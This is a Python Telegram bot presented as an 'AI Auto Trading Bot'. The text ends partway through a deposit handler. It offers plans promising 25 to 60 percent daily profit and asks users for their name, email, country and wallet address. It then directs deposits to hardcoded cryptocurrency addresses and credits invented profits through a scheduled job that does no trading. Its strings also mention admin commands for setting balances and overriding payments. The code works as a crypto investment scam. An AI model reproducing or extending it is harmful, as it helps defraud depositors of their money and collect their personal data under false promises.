import logging
import datetime
import asyncio
import aiohttp
import os
from typing import Optional

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Message
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ConversationHandler,
    MessageHandler,
    filters,
    CallbackContext,
)
import telegram.error

# ------------------------
# Environment Variables
# ------------------------
TGBOTTOKEN = os.environ["TGBOTTOKEN"]
WEBHOOK_BASE_URL = os.environ.get("WEBHOOK_URL", "https://example.com")  # e.g. "https://your-app.onrender.com"

# ------------------------
# Logging Configuration
# ------------------------
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# ------------------------
# Wallet Addresses
# ------------------------
WALLET_ADDRESSES = {
    "BTC": "bc1q9q75pdqn68kd9l3phk45lu9jdujuckewq6utp4",
    "ETH": "0x93883eB3E14050542FD3C4762952Db8d2db15fcF",
    "BNB": "0x93883eB3E14050542FD3C4762952Db8d2db15fcF",
    "SOL": "5ZE32mbM9Xy6hTvTUNjUrZ9NdmmBMRDgU9Gif4ytPsZg",
    "XRP": "rDBY4hZmoHzZJxkDbeeVdSU52WaXRtXSMJ",
    "USDT": {
        "BEP20": "0x93883eB3E14050542FD3C4762952Db8d2db15fcF",
        "TRC20": "TXPJLFHcjfk9rGrHQkdC6nLqADg85Z9TT2",
        "TON": "UQAC8C-BwxCCQKybyR1I3faHNg_PtHnVS2VytwC9XhE2alLo",
    },
}

# ------------------------
# Admin ID (Replace with your Telegram user ID)
# ------------------------
ADMIN_ID = int(os.environ.get("ADMIN_ID", "7533239927"))

# ------------------------
# Database Setup (SQLite + SQLAlchemy)
# ------------------------
from sqlalchemy import create_engine, Column, Integer, String, Float, Boolean, DateTime
from sqlalchemy.orm import declarative_base, sessionmaker

Base = declarative_base()

class UserAccount(Base):
    __tablename__ = "user_accounts"
    id              = Column(Integer, primary_key=True)
    telegram_id     = Column(Integer, unique=True, nullable=False)
    full_name       = Column(String, nullable=True)
    email           = Column(String, nullable=True)
    country         = Column(String, nullable=True)
    selected_plan   = Column(String, nullable=True)
    selected_crypto = Column(String, nullable=True)
    usdt_network    = Column(String, nullable=True)
    txid            = Column(String, nullable=True)
    deposit         = Column(Float, default=0)
    profit          = Column(Float, default=0)
    wallet_address  = Column(String, nullable=True)
    language        = Column(String, default="en")
    compound        = Column(Boolean, default=False)
    last_updated    = Column(DateTime, default=datetime.datetime.utcnow,
                             onupdate=datetime.datetime.utcnow)

engine = create_engine("sqlite:///crypto_bot.db", echo=False)
Base.metadata.create_all(engine)
SessionLocal = sessionmaker(bind=engine)

def get_session():
    return SessionLocal()

# ------------------------
# Multi-Language Dictionary (extended keys)
# ------------------------

LANG = {
    "en": {
        "welcome":         "Welcome to the AI Auto Trading Bot. Please choose an option:",
        "autotrading":     "Autotrading System",
        "balance":         "Balance",
        "contact_support": "Contact Support",
        "main_menu":       "Main Menu:",
        "deposit_success": "Deposit of ${amount:.2f} confirmed successfully! Please provide your wallet address for receiving your profits:",
        "activated":       "AI AUTO TRADING SYSTEM ACTIVATED.",
        "invalid_txid":    "Invalid transaction ID format. Please try again:",
        "txid_received":   "Transaction ID received: {txid}\nWe have verified a deposit of ${amount:.2f} based on your selected plan.\nPlease confirm the deposit.",
        "choose_language": "Choose your language:",
        "compound_on":     "Compound profit activated.",
        "compound_off":    "Compound profit deactivated.",
        "admin_not_auth":  "You are not authorized to use this command.",
        "admin_report":    "Admin Report:\nTotal Users: {total_users}\nTotal Deposits: ${total_deposit:.2f}\nTotal Profit: ${total_profit:.2f}",
        "ask_name":        "Please enter the depositor's full name:",
        "ask_email":       "Please enter the depositor's email address:",
        "ask_country":     "Please enter the depositor's country:",
        "ask_usdt_trc20":  "Please enter the depositor's USDT TRC20 receiving address:",
        "details_saved":   "Details saved. Now choose your deposit currency:",
        "ad_broadcasted":  "Ad broadcasted to {count} users.",
        "set_balance_ok":  "User {user_id} balance updated.",
        "override_ok":     "Payment override completed for user {user_id}.",
    },
    "es": {
        "welcome":         "Bienvenido al bot de trading automático con IA. Por favor, elige una opción:",
        "autotrading":     "Sistema de Autotrading",
        "balance":         "Saldo",
        "contact_support": "Contactar Soporte",
        "main_menu":       "Menú Principal:",
        "deposit_success": "Depósito de ${amount:.2f} confirmado con éxito. Por favor, proporciona la dirección de tu wallet para recibir tus ganancias:",
        "activated":       "SISTEMA DE AUTOTRADING ACTIVADO.",
        "invalid_txid":    "Formato de ID de transacción inválido. Por favor, inténtalo de nuevo:",
        "txid_received":   "ID de transacción recibido: {txid}\nHemos verificado un depósito de ${amount:.2f} basado en tu plan seleccionado.\nPor favor confirma el depósito.",
        "choose_language": "Elige tu idioma:",
        "compound_on":     "Compounding activado.",
        "compound_off":    "Compounding desactivado.",
        "admin_not_auth":  "No estás autorizado para usar este comando.",
        "admin_report":    "Reporte de Admin:\nTotal de Usuarios: {total_users}\nDepósitos Totales: ${total_deposit:.2f}\nGanancia Total: ${total_profit:.2f}",
        "ask_name":        "Por favor ingresa el nombre completo del depositante:",
        "ask_email":       "Por favor ingresa el correo electrónico del depositante:",
        "ask_country":     "Por favor ingresa el país del depositante:",
        "ask_usdt_trc20":  "Por favor ingresa la dirección TRC20 de USDT para recibir fondos:",
        "details_saved":   "Detalles guardados. Ahora elige la moneda para depositar:",
        "ad_broadcasted":  "Anuncio enviado a {count} usuarios.",
        "set_balance_ok":  "Saldo del usuario {user_id} actualizado.",
        "override_ok":     "Anulación de pago completada para el usuario {user_id}.",
    },
    "fr": {
        "welcome":         "Bienvenue sur le bot d'autotrading IA. Veuillez choisir une option :",
        "autotrading":     "Système d'autotrading",
        "balance":         "Solde",
        "contact_support": "Contacter le support",
        "main_menu":       "Menu principal :",
        "deposit_success": "Dépôt de ${amount:.2f} confirmé avec succès ! Veuillez fournir l'adresse de votre portefeuille pour recevoir vos gains :",
        "activated":       "SYSTÈME D'AUTOTRADING ACTIVÉ.",
        "invalid_txid":    "Format d'ID de transaction invalide. Veuillez réessayer :",
        "txid_received":   "ID de transaction reçu : {txid}\nNous avons vérifié un dépôt de ${amount:.2f} selon votre plan sélectionné.\nVeuillez confirmer le dépôt.",
        "choose_language": "Choisissez votre langue :",
        "compound_on":     "Profit composé activé.",
        "compound_off":    "Profit composé désactivé.",
        "admin_not_auth":  "Vous n'êtes pas autorisé à utiliser cette commande.",
        "admin_report":    "Rapport Admin :\nNombre total d'utilisateurs : {total_users}\nDépôts totaux : ${total_deposit:.2f}\nProfit total : ${total_profit:.2f}",
        "ask_name":        "Veuillez entrer le nom complet du déposant :",
        "ask_email":       "Veuillez entrer l'adresse e-mail du déposant :",
        "ask_country":     "Veuillez entrer le pays du déposant :",
        "ask_usdt_trc20":  "Veuillez entrer l'adresse TRC20 USDT du déposant pour recevoir les fonds :",
        "details_saved":   "Détails enregistrés. Choisissez maintenant votre devise de dépôt :",
        "ad_broadcasted":  "Annonce diffusée à {count} utilisateurs.",
        "set_balance_ok":  "Solde de l'utilisateur {user_id} mis à jour.",
        "override_ok":     "Surcharge de paiement terminée pour l'utilisateur {user_id}.",
    },
    "ru": {
        "welcome":         "Добро пожаловать в бот автоматической торговли с ИИ. Пожалуйста, выберите опцию:",
        "autotrading":     "Система автоматической торговли",
        "balance":         "Баланс",
        "contact_support": "Связаться со службой поддержки",
        "main_menu":       "Главное меню:",
        "deposit_success": "Депозит в размере ${amount:.2f} успешно подтвержден! Пожалуйста, укажите адрес кошелька для получения прибыли:",
        "activated":       "СИСТЕМА АВТОМАТИЧЕСКОЙ ТОРГОВЛИ АКТИВИРОВАНА.",
        "invalid_txid":    "Неверный формат ID транзакции. Пожалуйста, попробуйте снова:",
        "txid_received":   "ID транзакции получен: {txid}\nМы подтвердили депозит в размере ${amount:.2f} по выбранному плану.\nПожалуйста подтвердите депозит.",
        "choose_language": "Выберите ваш язык:",
        "compound_on":     "Сложный процент активирован.",
        "compound_off":    "Сложный процент отключен.",
        "admin_not_auth":  "Вы не авторизованы для использования этой команды.",
        "admin_report":    "Отчет администратора:\nВсего пользователей: {total_users}\nОбщий депозит: ${total_deposit:.2f}\nОбщий прибыль: ${total_profit:.2f}",
        "ask_name":        "Пожалуйста введите полное имя вкладчика:",
        "ask_email":       "Пожалуйста введите адрес электронной почты вкладчика:",
        "ask_country":     "Пожалуйста введите страну вкладчика:",
        "ask_usdt_trc20":  "Пожалуйста введите TRC20 адрес USDT для получения средств:",
        "details_saved":   "Данные сохранены. Теперь выберите валюту депозита:",
        "ad_broadcasted":  "Объявление разослано {count} пользователям.",
        "set_balance_ok":  "Баланс пользователя {user_id} обновлен.",
        "override_ok":     "Переопределение платежа выполнено для пользователя {user_id}.",
    },
    "ar": {
        "welcome":         "مرحبًا بك في بوت التداول التلقائي بالذكاء الاصطناعي. الرجاء اختيار خيار:",
        "autotrading":     "نظام التداول التلقائي",
        "balance":         "الرصيد",
        "contact_support": "اتصل بالدعم",
        "main_menu":       "القائمة الرئيسية:",
        "deposit_success": "تم تأكيد إيداع بقيمة ${amount:.2f} بنجاح! يرجى تزويدنا بعنوان محفظتك لاستلام أرباحك:",
        "activated":       "تم تفعيل نظام التداول الآلي.",
        "invalid_txid":    "تنسيق TXID غير صالح. يرجى المحاولة مرة أخرى:",
        "txid_received":   "تم استلام معرف المعاملة: {txid}\nلقد تحققنا من إيداع بقيمة ${amount:.2f} استنادًا إلى الخطة المختارة.\nيرجى تأكيد الإيداع.",
        "choose_language": "اختر لغتك:",
        "compound_on":     "تم تفعيل الربح المركب.",
        "compound_off":    "تم تعطيل الربح المركب.",
        "admin_not_auth":  "أنت غير مخول لاستخدام هذا الأمر.",
        "admin_report":    "تقرير المسؤول:\nإجمالي المستخدمين: {total_users}\nإجمالي الإيداعات: ${total_deposit:.2f}\nإجمالي الأرباح: ${total_profit:.2f}",
        "ask_name":        "الرجاء إدخال الاسم الكامل للمُودِع:",
        "ask_email":       "الرجاء إدخال بريد المُودِع الإلكتروني:",
        "ask_country":     "الرجاء إدخال بلد المُودِع:",
        "ask_usdt_trc20":  "الرجاء إدخال عنوان استلام USDT TRC20 للمُودِع:",
        "details_saved":   "تم حفظ التفاصيل. الآن اختر عملة الإيداع:",
        "ad_broadcasted":  "تم إرسال الإعلان إلى {count} مستخدمًا.",
        "set_balance_ok":  "تم تحديث رصيد المستخدم {user_id}.",
        "override_ok":     "تم تجاوز التحقق من الدفع للمستخدم {user_id}.",
    },
    "id": {
        "welcome":         "Selamat datang di Bot Trading Otomatis AI. Silakan pilih opsi:",
        "autotrading":     "Sistem Autotrading",
        "balance":         "Saldo",
        "contact_support": "Hubungi Dukungan",
        "main_menu":       "Menu Utama:",
        "deposit_success": "Deposit sebesar ${amount:.2f} telah dikonfirmasi! Silakan berikan alamat wallet Anda untuk menerima keuntungan:",
        "activated":       "SISTEM AUTOTRADING AKTIF.",
        "invalid_txid":    "Format ID transaksi tidak valid. Silakan coba lagi:",
        "txid_received":   "ID transaksi diterima: {txid}\nKami telah memverifikasi deposit sebesar ${amount:.2f} berdasarkan rencana yang dipilih.\nSilakan konfirmasi deposit.",
        "choose_language": "Pilih bahasa Anda:",
        "compound_on":     "Fitur compound diaktifkan.",
        "compound_off":    "Fitur compound dinonaktifkan.",
        "admin_not_auth":  "Anda tidak berwenang menggunakan perintah ini.",
        "admin_report":    "Laporan Admin:\nTotal Pengguna: {total_users}\nTotal Deposit: ${total_deposit:.2f}\nTotal Profit: ${total_profit:.2f}",
        "ask_name":        "Masukkan nama lengkap penyetor:",
        "ask_email":       "Masukkan alamat email penyetor:",
        "ask_country":     "Masukkan negara penyetor:",
        "ask_usdt_trc20":  "Masukkan alamat penerima USDT TRC20 penyetor:",
        "details_saved":   "Detail disimpan. Sekarang pilih mata uang deposit Anda:",
        "ad_broadcasted":  "Iklan dikirim ke {count} pengguna.",
        "set_balance_ok":  "Saldo pengguna {user_id} diperbarui.",
        "override_ok":     "Penggantian pembayaran selesai untuk pengguna {user_id}.",
    },
    "de": {
        "welcome":         "Willkommen beim KI-Auto-Trading-Bot. Bitte wählen Sie eine Option:",
        "autotrading":     "Auto-Trading-System",
        "balance":         "Kontostand",
        "contact_support": "Support kontaktieren",
        "main_menu":       "Hauptmenü:",
        "deposit_success": "Einzahlung von ${amount:.2f} erfolgreich bestätigt! Bitte geben Sie Ihre Wallet-Adresse an, um Ihre Gewinne zu erhalten:",
        "activated":       "KI-AUTO-TRADING-SYSTEM AKTIVIERT.",
        "invalid_txid":    "Ungültiges Transaktions-ID-Format. Bitte versuchen Sie es erneut:",
        "txid_received":   "Transaktions-ID erhalten: {txid}\nWir haben eine Einzahlung von ${amount:.2f} gemäß Ihrem gewählten Plan bestätigt。\nBitte bestätigen Sie die Einzahlung.",
        "choose_language": "Wählen Sie Ihre Sprache:",
        "compound_on":     "Compound-Gewinn aktiviert.",
        "compound_off":    "Compound-Gewinn deaktiviert.",
        "admin_not_auth":  "Sie sind nicht berechtigt, diesen Befehl zu verwenden.",
        "admin_report":    "Admin-Bericht:\nGesamtbenutzer: {total_users}\nGesamteinzahlungen: ${total_deposit:.2f}\nGesamtgewinn: ${total_profit:.2f}",
        "ask_name":        "Bitte geben Sie den vollständigen Namen des Einzahlers ein:",
        "ask_email":       "Bitte geben Sie die E-Mail-Adresse des Einzahlers ein:",
        "ask_country":     "Bitte geben Sie das Land des Einzahlers ein:",
        "ask_usdt_trc20":  "Bitte geben Sie die USDT TRC20-Adresse des Einzahlers zum Empfangen der Gelder ein:",
        "details_saved":   "Details gespeichert. Wählen Sie nun Ihre Einzahlungswährung:",
        "ad_broadcasted":  "Anzeige an {count} Benutzer gesendet.",
        "set_balance_ok":  "Kontostand von Benutzer {user_id} aktualisiert.",
        "override_ok":     "Zahlungsüberschreibung für Benutzer {user_id} abgeschlossen.",
    },
    "hi": {
        "welcome":         "AI ऑटो ट्रेडिंग बोट में आपका स्वागत है। कृपया एक विकल्प चुनें:",
        "autotrading":     "ऑटो ट्रेडिंग सिस्टम",
        "balance":         "बैलेंस",
        "contact_support": "सपोर्ट से संपर्क करें",
        "main_menu":       "मुख्य मेन्यू:",
        "deposit_success": "डिपॉज़िट ${amount:.2f} सफलतापूर्वक पुष्टि हो गया! कृपया अपने लाभ प्राप्त करने के लिए अपना वॉलेट पता दें:",
        "activated":       "AI ऑटो ट्रेडिंग सिस्टम सक्रिय।",
        "invalid_txid":    "अमान्य TXID प्रारूप। कृपया पुनः प्रयास करें:",
        "txid_received":   "TXID प्राप्त हुआ: {txid}\nहमने आपके चुने गए प्लान के आधार पर ${amount:.2f} का जमा सत्यापित किया है।\nकृपया जमा की पुष्टि करें।",
        "choose_language": "अपनी भाषा चुनें:",
        "compound_on":     "कम्पाउंड मुनाफा सक्रिय।",
        "compound_off":    "कम्पाउंड मुनाफा अक्षम।",
        "admin_not_auth":  "आप इस कमांड का उपयोग करने के लिए अधिकृत नहीं हैं।",
        "admin_report":    "एडमिन रिपोर्ट:\nकुल उपयोगकर्ता: {total_users}\nकुल जमा: ${total_deposit:.2f}\nकुल मुनाफा: ${total_profit:.2f}",
        "ask_name":        "कृपया जमाकर्ता का पूरा नाम दर्ज करें:",
        "ask_email":       "कृपया जमाकर्ता का ईमेल दर्ज करें:",
        "ask_country":     "कृपया जमाकर्ता का देश दर्ज करें:",
        "ask_usdt_trc20":  "कृपया जमाकर्ता का USDT TRC20 पता दर्ज करें:",
        "details_saved":   "विवरण सहेजे गए। अब अपनी जमा मुद्रा चुनें:",
        "ad_broadcasted":  "विज्ञापन {count} उपयोगकर्ताओं को भेजा गया।",
        "set_balance_ok":  "उपयोगकर्ता {user_id} का बैलेंस अपडेट किया गया।",
        "override_ok":     "उपयोगकर्ता {user_id} के लिए भुगतान ओवरराइड पूरा हुआ।",
    },
    "zh": {
        "welcome":         "欢迎使用 AI 自动交易机器人。请选择一个选项：",
        "autotrading":     "自动交易系统",
        "balance":         "余额",
        "contact_support": "联系支持",
        "main_menu":       "主菜单：",
        "deposit_success": "存款 ${amount:.2f} 已成功确认！请提供您的钱包地址以接收收益：",
        "activated":       "AI 自动交易系统已激活。",
        "invalid_txid":    "无效的 TXID 格式。请重试：",
        "txid_received":   "收到 TXID：{txid}\n我们已根据您选择的计划验证了 ${amount:.2f} 的存款。\n请确认存款。",
        "choose_language": "请选择您的语言：",
        "compound_on":     "复利已激活。",
        "compound_off":    "复利已停用。",
        "admin_not_auth":  "您无权使用此命令。",
        "admin_report":    "管理员报告：\n用户总数：{total_users}\n总存款：${total_deposit:.2f}\n总利润：${total_profit:.2f}",
        "ask_name":        "请输入存款人的全名：",
        "ask_email":       "请输入存款人的电子邮件地址：",
        "ask_country":     "请输入存款人的国家：",
        "ask_usdt_trc20":  "请输入存款人的 USDT TRC20 收款地址：",
        "details_saved":   "详情已保存。现在请选择您的存款货币：",
        "ad_broadcasted":  "广告已向 {count} 名用户广播。",
        "set_balance_ok":  "用户 {user_id} 的余额已更新。",
        "override_ok":     "已为用户 {user_id} 完成支付覆盖。",
    },
}

def get_msg(lang, key, **kwargs):
    template = LANG.get(lang, LANG["en"]).get(key, LANG["en"].get(key, ""))
    return template.format(**kwargs) if kwargs else template

# ------------------------
# Trading Plans
# ------------------------
TRADING_PLANS = {
    "plan_1": {"title": "🚨FIRST PLAN",  "equity_range": "$500 - $999",       "profit_percent": 25},
    "plan_2": {"title": "🚨SECOND PLAN", "equity_range": "$1,000 - $4,999",     "profit_percent": 30},
    "plan_3": {"title": "🚨THIRD PLAN",  "equity_range": "$5,000 - $9,999",     "profit_percent": 45},
    "plan_4": {"title": "🚨FOURTH PLAN", "equity_range": "$10,000 - $49,999",   "profit_percent": 50},
    "plan_5": {"title": "🚨FIFTH PLAN",  "equity_range": "$50,000 - $199,999",   "profit_percent": 55},
    "plan_6": {"title": "🚨SIXTH PLAN",  "equity_range": "$200,000 and above",  "profit_percent": 60},
}

# ------------------------
# Conversation States
# ------------------------
STATE_TXID = 1
STATE_CONFIRM = 2
STATE_WALLET = 3
# New detail collection states
STATE_NAME = 10
STATE_EMAIL = 11
STATE_COUNTRY = 12
STATE_USDT_TRC20 = 13

# ------------------------
# Verify TXID on Blockchain (unchanged)
# ------------------------
async def verify_txid_on_blockchain(txid: str, crypto: str, context: CallbackContext = None) -> bool:
    crypto = crypto.upper()
    async with aiohttp.ClientSession() as session:
        try:
            if crypto == "ETH":
                key = os.environ.get("ETHERSCAN_API_KEY")
                if not key:
                    return False
                url = f"https://api.etherscan.io/api?module=transaction&action=getstatus&txhash={txid}&apikey={key}"
                r = await session.get(url, timeout=10)
                data = await r.json()
                return data.get("status") == "1" and data.get("result", {}).get("txreceipt_status") == "1"
            elif crypto == "BTC":
                token = os.environ.get("BLOCKCYPHER_TOKEN")
                if not token:
                    return False
                url = f"https://api.blockcypher.com/v1/btc/main/txs/{txid}?token={token}"
                r = await session.get(url, timeout=10)
                data = await r.json()
                return data.get("confirmations", 0) > 0
            elif crypto == "BNB":
                key = os.environ.get("BSCSCAN_API_KEY")
                if not key:
                    return False
                url = f"https://api.bscscan.com/api?module=transaction&action=getstatus&txhash={txid}&apikey={key}"
                r = await session.get(url, timeout=10)
                data = await r.json()
                return data.get("status") == "1" and data.get("result", {}).get("txreceipt_status") == "1"
            elif crypto == "SOL":
                url = "https://api.mainnet-beta.solana.com/"
                payload = {"jsonrpc": "2.0", "id": 1, "method": "getTransaction", "params": [txid, {"encoding": "json"}]}
                r = await session.post(url, json=payload, timeout=10)
                data = await r.json()
                return data.get("result") is not None
            elif crypto == "XRP":
                url = f"https://data.ripple.com/v2/transactions/{txid}"
                r = await session.get(url, timeout=10)
                data = await r.json()
                return data.get("result") == "success"
            elif crypto == "TRX":
                url = f"https://apilist.tronscan.org/api/transaction-info?hash={txid}"
                r = await session.get(url, timeout=10)
                data = await r.json()
                ret = data.get("ret")
                return isinstance(ret, list) and ret and ret[0].get("contractRet") == "SUCCESS"
            elif crypto == "TON":
                key = os.environ.get("TONCENTER_API_KEY")
                if not key:
                    return False
                url = f"https://toncenter.com/api/v2/getTransaction?hash={txid}&api_key={key}"
                r = await session.get(url, timeout=10)
                data = await r.json()
                return data.get("result") is not None
            elif crypto == "USDT":
                net = context.user_data.get("usdt_network", "ETH")
                return await verify_txid_on_blockchain(txid, net, context)
        except Exception as e:
            logger.error("Error verifying %s TXID: %s", crypto, e)
    return False

# ------------------------
# Daily Profit Update
# ------------------------
async def update_daily_profits(context: CallbackContext):
    session = get_session()
    users = session.query(UserAccount).all()
    for user in users:
        if user.selected_plan and user.deposit > 0:
            rate = TRADING_PLANS[user.selected_plan]["profit_percent"] / 100
            profit = user.deposit * rate
            user.profit += profit
            if user.compound:
                user.deposit += profit
    session.commit()
    session.close()
    logger.info("Daily profits updated.")

# ------------------------
# Global Error Handler
# ------------------------
async def error_handler(update: object, context: CallbackContext):
    logger.error("Exception while handling an update:", exc_info=context.error)

# ------------------------
# Bot Handlers
# ------------------------
async def start(update: Update, context: CallbackContext):
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    session.close()
    # If no user or language is set, show language selection instead
    if not user or not user.language:
        await choose_language(update, context)
        return

    lang = user.language
    kb = [
        [InlineKeyboardButton(get_msg(lang, "autotrading"), callback_data="autotrading")],
        [InlineKeyboardButton(get_msg(lang, "balance"),     callback_data="balance")],
        [InlineKeyboardButton(get_msg(lang, "contact_support"), url="https://t.me/cryptotitan999")],
    ]
    if update.callback_query:
        await update.callback_query.edit_message_text(get_msg(lang, "welcome"), reply_markup=InlineKeyboardMarkup(kb))
    else:
        await update.message.reply_text(get_msg(lang, "welcome"), reply_markup=InlineKeyboardMarkup(kb))

async def main_menu(update: Update, context: CallbackContext):
    try:
        await update.callback_query.answer()
    except telegram.error.BadRequest as e:
        if "too old" in str(e):
            logger.warning("Expired callback in main_menu: %s", e)
        else:
            raise

    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    session.close()
    lang = user.language if user else "en"
    kb = [
        [InlineKeyboardButton(get_msg(lang, "autotrading"), callback_data="autotrading")],
        [InlineKeyboardButton(get_msg(lang, "balance"),     callback_data="balance")],
        [InlineKeyboardButton(get_msg(lang, "contact_support"), url="https://t.me/cryptotitan999")],
    ]
    await update.callback_query.edit_message_text(get_msg(lang, "main_menu"), reply_markup=InlineKeyboardMarkup(kb))

async def autotrading_menu(update: Update, context: CallbackContext):
    try:
        await update.callback_query.answer()
    except telegram.error.BadRequest as e:
        if "too old" in str(e):
            logger.warning("Expired callback in autotrading_menu: %s", e)
        else:
            raise

    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    session.close()
    lang = user.language if user else "en"

    lines = ["AI AUTO TRADING PLANS:"]
    for key, plan in TRADING_PLANS.items():
        lines.extend([
            "",
            plan["title"],
            f"Equity Range: {plan['equity_range']}",
            f"Profit: {plan['profit_percent']}% daily.",
            "ROI: Yes ✅"
        ])

    kb = [
        [InlineKeyboardButton("FIRST PLAN",  callback_data="plan_1"),
         InlineKeyboardButton("SECOND PLAN", callback_data="plan_2")],
        [InlineKeyboardButton("THIRD PLAN",  callback_data="plan_3"),
         InlineKeyboardButton("FOURTH PLAN", callback_data="plan_4")],
        [InlineKeyboardButton("FIFTH PLAN",  callback_data="plan_5"),
         InlineKeyboardButton("SIXTH PLAN",  callback_data="plan_6")],
        [InlineKeyboardButton("BACK",        callback_data="main_menu")],
    ]
    await update.callback_query.edit_message_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(kb))

async def plan_selection(update: Update, context: CallbackContext):
    try:
        await update.callback_query.answer()
    except telegram.error.BadRequest as e:
        if "too old" in str(e):
            logger.warning("Expired callback in plan_selection: %s", e)
        else:
            raise

    plan = update.callback_query.data
    context.user_data["selected_plan"] = plan
    details = TRADING_PLANS[plan]
    text = (
        f"You selected {details['title']}:\n"
        f"Equity Range: {details['equity_range']}\n"
        f"Profit: {details['profit_percent']}% daily.\n\n"
        "Before proceeding, please provide depositor details."
    )
    kb = [
        [InlineKeyboardButton("PROVIDE DETAILS", callback_data="collect_details")],
        [InlineKeyboardButton("CANCEL", callback_data="main_menu")],
    ]
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb))

# ------------------------
# DETAILS collection flow
# ------------------------
async def start_collect_details(update: Update, context: CallbackContext):
    # Entry point when user clicks PROVIDE DETAILS
    try:
        await update.callback_query.answer()
    except telegram.error.BadRequest:
        pass
    lang = "en"
    # try to fetch user's language from DB
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    session.close()
    lang = user.language if user else "en"
    await update.callback_query.edit_message_text(get_msg(lang, "ask_name"))
    return STATE_NAME

async def handle_name(update: Update, context: CallbackContext):
    name = update.message.text.strip()
    context.user_data["depositor_name"] = name
    # ask email
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    session.close()
    lang = user.language if user else "en"
    await update.message.reply_text(get_msg(lang, "ask_email"))
    return STATE_EMAIL

async def handle_email(update: Update, context: CallbackContext):
    email = update.message.text.strip()
    context.user_data["depositor_email"] = email
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    session.close()
    lang = user.language if user else "en"
    await update.message.reply_text(get_msg(lang, "ask_country"))
    return STATE_COUNTRY

async def handle_country(update: Update, context: CallbackContext):
    country = update.message.text.strip()
    context.user_data["depositor_country"] = country
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    session.close()
    lang = user.language if user else "en"
    await update.message.reply_text(get_msg(lang, "ask_usdt_trc20"))
    return STATE_USDT_TRC20

async def handle_usdt_trc20(update: Update, context: CallbackContext):
    addr = update.message.text.strip()
    context.user_data["depositor_usdt_trc20"] = addr

    # save to DB (create or update user record)
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    if user:
        user.full_name = context.user_data.get("depositor_name")
        user.email = context.user_data.get("depositor_email")
        user.country = context.user_data.get("depositor_country")
        user.wallet_address = addr  # save as receiving address
        user.selected_plan = context.user_data.get("selected_plan")
    else:
        user = UserAccount(
            telegram_id = update.effective_user.id,
            full_name = context.user_data.get("depositor_name"),
            email = context.user_data.get("depositor_email"),
            country = context.user_data.get("depositor_country"),
            wallet_address = addr,
            selected_plan = context.user_data.get("selected_plan"),
            language = "en",
        )
        session.add(user)
    session.commit()
    session.close()

    # Prompt user to choose deposit currency next
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    lang = user.language if user else "en"
    kb = [
        [InlineKeyboardButton("BTC",  callback_data="pay_btc"),
         InlineKeyboardButton("ETH",  callback_data="pay_eth")],
        [InlineKeyboardButton("USDT", callback_data="pay_usdt"),
         InlineKeyboardButton("BNB",  callback_data="pay_bnb")],
        [InlineKeyboardButton("SOL",  callback_data="pay_sol"),
         InlineKeyboardButton("XRP",  callback_data="pay_xrp")],
        [InlineKeyboardButton("BACK", callback_data="autotrading")],
    ]
    await update.message.reply_text(get_msg(lang, "details_saved"), reply_markup=InlineKeyboardMarkup(kb))
    return ConversationHandler.END

# ------------------------
# Existing payment flow (slightly adapted)
# ------------------------
async def payment_method_menu(update: Update, context: CallbackContext):
    try:
        await update.callback_query.answer()
    except telegram.error.BadRequest as e:
        if "too old" in str(e):
            logger.warning("Expired callback in payment_method_menu: %s", e)
        else:
            raise

    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    session.close()
    lang = user.language if user else "en"

    plan = context.user_data.get("selected_plan")
    text = f"You selected {TRADING_PLANS[plan]['title']}.\nChoose your deposit currency:" if plan in TRADING_PLANS else "Choose your deposit currency:"
    kb = [
        [InlineKeyboardButton("BTC",  callback_data="pay_btc"),
         InlineKeyboardButton("ETH",  callback_data="pay_eth")],
        [InlineKeyboardButton("USDT", callback_data="pay_usdt"),
         InlineKeyboardButton("BNB",  callback_data="pay_bnb")],
        [InlineKeyboardButton("SOL",  callback_data="pay_sol"),
         InlineKeyboardButton("XRP",  callback_data="pay_xrp")],
        [InlineKeyboardButton("BACK", callback_data="autotrading")],
    ]
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb))

async def usdt_network_menu(update: Update, context: CallbackContext):
    try:
        await update.callback_query.answer()
    except telegram.error.BadRequest as e:
        if "too old" in str(e):
            logger.warning("Expired callback in usdt_network_menu: %s", e)
        else:
            raise

    kb = [
        [InlineKeyboardButton("USDT BEP20", callback_data="usdt_BEP20"),
         InlineKeyboardButton("USDT TRC20", callback_data="usdt_TRC20"),
         InlineKeyboardButton("USDT TON",   callback_data="usdt_TON")],
        [InlineKeyboardButton("BACK", callback_data="payment_method")],
    ]
    await update.callback_query.edit_message_text(
        "USDT selected. Please choose the USDT network:",
        reply_markup=InlineKeyboardMarkup(kb)
    )

async def send_deposit_address(update: Update, context: CallbackContext):
    try:
        await update.callback_query.answer()
    except telegram.error.BadRequest as e:
        if "too old" in str(e):
            logger.warning("Expired callback in send_deposit_address: %s", e)
        else:
            raise

    data = update.callback_query.data
    if data.startswith("pay_"):
        crypto = data.split("_")[1].upper()
        network = None
    elif data.startswith("usdt_"):
        crypto = "USDT"
        network = data.split("_")[1]
        context.user_data["usdt_network"] = network
    else:
        return

    context.user_data["selected_crypto"] = crypto
    if crypto == "USDT" and network:
        addr = WALLET_ADDRESSES["USDT"].get(network, "Not configured")
        disp = f"{crypto} ({network})"
    else:
        addr = WALLET_ADDRESSES.get(crypto, "Not configured")
        disp = crypto

    text = (
        f"Please deposit using {disp} to the following address:\n\n"
        f"<code>{addr}</code>\n\nWhen done, click DONE."
    )
    kb = [
